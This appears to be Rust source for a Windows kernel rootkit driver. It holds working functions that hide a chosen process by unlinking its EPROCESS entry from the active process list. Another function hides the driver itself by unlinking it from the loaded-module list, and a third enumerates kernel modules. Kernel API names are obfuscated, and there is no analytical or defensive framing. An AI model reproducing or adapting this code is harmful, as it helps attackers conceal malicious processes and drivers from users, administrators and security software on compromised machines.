use core::{mem::size_of, ptr::{addr_of_mut}, intrinsics::{transmute, copy_nonoverlapping}};

use common::ModuleInformation;
use ntapi::ntldr::LDR_DATA_TABLE_ENTRY;
use winapi::{shared::{ntdef::{LIST_ENTRY, UNICODE_STRING}}, km::wdm::{PEPROCESS, DEVICE_OBJECT, KIRQL}};
use crate::{includes::{PsGetCurrentProcess}, process::get_function_base_address, string::create_unicode_string};



/*
kd> dt nt!_EPROCESS
    +0x000 Pcb              : _KPROCESS
    +0x438 ProcessLock      : _EX_PUSH_LOCK
    +0x440 UniqueProcessId  : Ptr64 Void
    +0x448 ActiveProcessLinks : _LIST_ENTRY
*/

/*
0: kd> u PsGetProcessId
nt!PsGetProcessId:
    fffff800`58e6ab30 488b8140040000  mov     rax,qword ptr [rcx+440h]
*/

/// Get the offset to nt!_EPROCESS.UniqueProcessId
fn get_unique_pid_offset() -> usize {
    let unicode_function_name = &mut create_unicode_string(
        obfstr::wide!("PsGetProcessId\0")
    ) as *mut UNICODE_STRING;

    let base_address = get_function_base_address(unicode_function_name);
    let function_bytes: &[u8] = unsafe { core::slice::from_raw_parts(base_address as *const u8, 5) };

    let slice = &function_bytes[3..5];
    let unique_pid_offset = u16::from_le_bytes(slice.try_into().unwrap());
    log::info!("EPROCESS.UniqueProcessId: {:#x}", unique_pid_offset);

    return unique_pid_offset as usize;
}

pub fn hide_process(pid: u32) -> Result<bool, &'static str> {
    //nt!_EPROCESS.UniqueProcessId
    let unique_process_id_offset: usize = get_unique_pid_offset();

    //nt!_EPROCESS.ActiveProcessLinks
    let active_process_links_offset: usize = unique_process_id_offset + size_of::<usize>();

    //The PsGetCurrentProcessId routine identifies the current thread's process.
    let mut current_eprocess = unsafe { PsGetCurrentProcess() };

    log::info!("current_eprocess: {:?}", current_eprocess);

    if current_eprocess.is_null() {
        log::info!("Failed to call PsGetCurrentProcess");
        return Err("Failed to call PsGetCurrentProcess");
    }

    //ActiveProcessLinks: hardcoded offset as this has not changed through various version of windows
    let mut current_list = (current_eprocess as usize + active_process_links_offset) as *mut LIST_ENTRY;
    let mut current_pid = (current_eprocess as usize + unique_process_id_offset) as *mut u32;

    // Check if the current process ID is the one to hide
    if unsafe { (*current_pid) == pid } {
        remove_links(current_list);
        return Ok(true);
    }

    // This is the starting position
    let start_process: PEPROCESS = current_eprocess;

    // Iterate over the next EPROCESS structure of a process
    current_eprocess = unsafe { ((*current_list).Flink as usize - active_process_links_offset) as PEPROCESS };
    current_pid = (current_eprocess as usize + unique_process_id_offset) as *mut u32;
    current_list = (current_eprocess as usize + active_process_links_offset) as *mut LIST_ENTRY;

    // Loop until the circle is complete or until the process ID is found
    while start_process as usize != current_eprocess as usize {
        
        // Check if the current process ID is the one to hide
        if unsafe { (*current_pid) == pid } {
            remove_links(current_list);
            return Ok(true);
        }

        // Iterate over the next EPROCESS structure of a process
        current_eprocess = unsafe { ((*current_list).Flink as usize - active_process_links_offset) as PEPROCESS };
        current_pid = (current_eprocess as usize + unique_process_id_offset) as *mut u32;
        current_list = (current_eprocess as usize + active_process_links_offset) as *mut LIST_ENTRY;
    }


    return Ok(true);
}

fn remove_links(current: *mut LIST_ENTRY) {
    let previous = unsafe { (*current).Blink };
    let next = unsafe { (*current).Flink };

    unsafe { (*previous).Flink = next };
    unsafe { (*next).Blink = previous };

    // This will re-write the current LIST_ENTRY to point to itself to avoid BSOD
    unsafe { (*current).Blink = addr_of_mut!((*current).Flink).cast::<LIST_ENTRY>() };
    unsafe { (*current).Flink = addr_of_mut!((*current).Flink).cast::<LIST_ENTRY>() };
}

type FnKeRaiseIrqlToDpcLevel = unsafe extern "system" fn() -> KIRQL;
type FnKeLowerIrql = unsafe extern "system" fn(new_irql: KIRQL);
type FnKeGetCurrentIrql = unsafe extern "system" fn() -> KIRQL;

pub fn hide_driver(device_object: &mut DEVICE_OBJECT) -> Result<bool, &'static str> {

    //KeRaiseIrqlToDpcLevel
    let unicode_function_name = &mut create_unicode_string(
        obfstr::wide!("KeRaiseIrqlToDpcLevel\0")
    ) as *mut UNICODE_STRING;
    
    let ptr_ke_raise_irql_to_dpc_level = get_function_base_address(unicode_function_name);

    if ptr_ke_raise_irql_to_dpc_level.is_null() {
        log::error!("KeRaiseIrqlToDpcLevel is null");
        return Err("KeRaiseIrqlToDpcLevel is null");
    }

    //KeLowerIrql
    let unicode_function_name = &mut create_unicode_string(
        obfstr::wide!("KeLowerIrql\0")
    ) as *mut UNICODE_STRING;
    
    let ptr_ke_lower_irql = get_function_base_address(unicode_function_name);

    if ptr_ke_lower_irql.is_null() {
        log::error!("KeLowerIrql is null");
        return Err("KeLowerIrql is null");
    }

    //KeGetCurrentIrql
    let unicode_function_name = &mut create_unicode_string(
        obfstr::wide!("KeGetCurrentIrql\0")
    ) as *mut UNICODE_STRING;
    
    let ptr_ke_get_current_irql = get_function_base_address(unicode_function_name);

    if ptr_ke_get_current_irql.is_null() {
        log::error!("KeGetCurrentIrql is null");
        return Err("KeGetCurrentIrql is null");
    }

    //Convert to function pointers
    #[allow(non_snake_case)]
    let KeGetCurrentIrql = unsafe { transmute::<_, FnKeGetCurrentIrql>(ptr_ke_get_current_irql) };
    #[allow(non_snake_case)]
    let KeRaiseIrqlToDpcLevel = unsafe { transmute::<_, FnKeRaiseIrqlToDpcLevel>(ptr_ke_raise_irql_to_dpc_level) };
    #[allow(non_snake_case)]
    let KeLowerIrql = unsafe { transmute::<_, FnKeLowerIrql>(ptr_ke_lower_irql) };

    //The KeGetCurrentIrql routine returns the current IRQL. For information about IRQLs, see Managing Hardware Priorities.
    let current_irql = unsafe { KeGetCurrentIrql() };
    log::info!("1st KeGetCurrentIrql: {:?}", current_irql);

    //The KeRaiseIrqlToDpcLevel routine raises the hardware priority to IRQL = DISPATCH_LEVEL, thereby masking off interrupts of equivalent or lower IRQL on the current processor.
    let irql = unsafe { KeRaiseIrqlToDpcLevel() };
    log::info!("KeRaiseIrqlToDpcLevel: IRQL is {:?}", irql);

    if device_object.DriverObject.is_null() {
        log::info!("DriverObject is null");
        return Err("DriverObject is null");
    }

    let module_entry = unsafe { (*device_object.DriverObject).DriverSection as *mut LDR_DATA_TABLE_ENTRY };


    let previous_entry =  unsafe { (*module_entry).InLoadOrderLinks.Blink as *mut LDR_DATA_TABLE_ENTRY };
    let next_entry = unsafe { (*module_entry).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY };


    unsafe { (*previous_entry).InLoadOrderLinks.Flink = (*module_entry).InLoadOrderLinks.Flink };
    unsafe { (*next_entry).InLoadOrderLinks.Blink = (*module_entry).InLoadOrderLinks.Blink };

    unsafe { (*module_entry).InLoadOrderLinks.Flink = module_entry as *mut ntapi::winapi::shared::ntdef::LIST_ENTRY };
    unsafe { (*module_entry).InLoadOrderLinks.Blink = module_entry as *mut ntapi::winapi::shared::ntdef::LIST_ENTRY };


    //The KeLowerIrql routine restores the IRQL on the current processor to its original value. For information about IRQLs, see Managing Hardware Priorities.
    unsafe { KeLowerIrql(irql) };
    log::info!("KeLowerIrql: IRQL is {:?}", irql);
    
    let current_irql = unsafe { KeGetCurrentIrql() };
    log::info!("1st KeGetCurrentIrql: {:?}", current_irql);

    return Ok(true);
}

pub fn get_kernel_loaded_modules(module_information: *mut ModuleInformation, information: *mut usize) -> Result<bool, &'static str> {
    //KeRaiseIrqlToDpcLevel
    let unicode_function_name = &mut create_unicode_string(
        obfstr::wide!("PsLoadedModuleList\0")
    ) as *mut UNICODE_STRING;
    
    let ptr_ps_loaded_module_list = get_function_base_address(unicode_function_name) as *mut LDR_DATA_TABLE_ENTRY;

    if ptr_ps_loaded_module_list.is_null() {
        log::error!("ptr_ps_loaded_module_list is null");
        return Err("ptr_ps_loaded_module_list is null");
    }

    log::info!("ptr_ps_loaded_module_list {:?}", ptr_ps_loaded_module_list);

    let current = ptr_ps_loaded_module_list as *mut LIST_ENTRY;
    let mut next = unsafe { (*ptr_ps_loaded_module_list).InLoadOrderLinks.Flink as *mut LIST_ENTRY };

    let mut i = 0;

    // loop through the linked list
    while next as usize != current as usize {
        
        //Get module base and name
        let mod_base = unsafe { (*(next as *mut LDR_DATA_TABLE_ENTRY)).DllBase };
        let mod_name = unsafe { (*(next as *mut LDR_DATA_TABLE_ENTRY)).BaseDllName };
        let name_slice = unsafe { core::slice::from_raw_parts(mod_name.Buffer, mod_name.Length as usize / 2) } ;
        //log::info!("Module: {:?}", String::from_utf16_lossy(name_slice));

        // Store the information in user buffer
        //Address
        unsafe { (*module_information.offset(i)).module_base = mod_base as usize };
        
        //Name
        let dst = unsafe { (*module_information.offset(i)).module_name.as_mut() };
        unsafe { copy_nonoverlapping(name_slice.as_ptr(), dst.as_mut_ptr(), name_slice.len()) };


        i = i + 1; // increase i to keep track
        
        unsafe { (*information) += size_of::<ModuleInformation>() };
        
        // go to next module
        next = unsafe { (*next).Flink };
    }

    return Ok(true);
}

/*
0: kd> dt _DRIVER_OBJECT
nt!_DRIVER_OBJECT
   +0x000 Type             : Int2B
   +0x002 Size             : Int2B
   +0x008 DeviceObject     : Ptr64 _DEVICE_OBJECT
   +0x010 Flags            : Uint4B
   +0x018 DriverStart      : Ptr64 Void
   +0x020 DriverSize       : Uint4B
   +0x028 DriverSection    : Ptr64 Void
   +0x030 DriverExtension  : Ptr64 _DRIVER_EXTENSION
   +0x038 DriverName       : _UNICODE_STRING
   +0x048 HardwareDatabase : Ptr64 _UNICODE_STRING
   +0x050 FastIoDispatch   : Ptr64 _FAST_IO_DISPATCH
   +0x058 DriverInit       : Ptr64     long 
   +0x060 DriverStartIo    : Ptr64     void 
   +0x068 DriverUnload     : Ptr64     void 
   +0x070 MajorFunction    : [28] Ptr64     long 
*/